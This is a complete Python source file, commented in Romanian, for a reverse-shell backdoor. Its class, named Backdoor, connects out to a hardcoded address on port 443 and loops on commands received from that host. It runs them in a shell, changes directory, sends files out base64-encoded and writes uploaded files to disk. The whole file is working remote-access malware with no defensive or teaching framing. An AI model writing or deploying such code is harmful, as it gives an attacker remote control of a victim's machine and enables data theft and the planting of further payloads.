import socket
import subprocess
import simplejson
import os
import base64
import re
import optparse


class Backdoor():
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        if isinstance(data,str):
            json_data = simplejson.dumps(data)
        else:
            json_data = simplejson.dumps(data.decode('iso-8859-1').strip()) # convert in json
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            # facem infinit loop pana il luam pe tot  cand ajung in except trebuie sa continue
            try:
                json_data = json_data + str(self.connection.recv(1024).decode('utf-8'))
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def execute_command(self,command):
        return subprocess.check_output(command,shell = True)

    def change_working_directory_to(self, path):
        os.chdir(r""+path)
        return "Schimbare director la {}".format(path)

    def read_file(self, path):
        with open(path, "rb") as file:
            content = base64.b64encode(file.read()) 
            return content

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(bytes(content, 'utf8',errors="ignore")))
            return "Upload cu succes!"
    

    #connection.send("\n Conexiune stabilita \n".encode())
    # aici executam comenzile
    def run(self):
        while True:
            #setam bufferul
            reicv_data = self.reliable_receive()
            try:

                if reicv_data[0] == "exit": # in cazul in care primim exit sa inchidem backdoor
                    self.connection.close()
                    exit()
                elif reicv_data[0] == "cd" and len(reicv_data) > 1:
                    command_result = self.change_working_directory_to(reicv_data[1]) # a 2 a din lista pe care am facut-o split
                
                elif reicv_data[0] == "download":
                    command_result = self.read_file(reicv_data[1])
                
                elif reicv_data[0] == "upload":
                    command_result = self.write_file(reicv_data[1], reicv_data[2])
                else:
                    command_result = self.execute_command(reicv_data)
            except Exception:
                command_result = "Eroare in executia comenzii"
                
            self.reliable_send(command_result)
        
        self.connection.close()



backdoor = Backdoor("192.168.0.148",443)
backdoor.run()